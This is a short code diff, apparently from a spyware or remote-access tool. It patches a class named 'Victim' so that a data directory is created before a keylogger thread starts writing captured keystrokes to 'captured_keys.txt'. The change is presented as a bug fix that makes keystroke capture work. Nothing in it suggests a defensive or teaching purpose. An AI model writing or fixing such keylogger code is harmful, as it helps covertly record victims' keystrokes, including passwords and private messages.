@@ -221,6 +221,9 @@ class Victim:
             return
             
         try:
+            # FIX: Ensure data directory exists before starting keylogger
+            os.makedirs("./data", exist_ok=True)
+            
             self.keylogger = Keylogger(log_path="./data/captured_keys.txt")
             self.keylogger_thread = threading.Thread(
                 target=self.keylogger.run, 
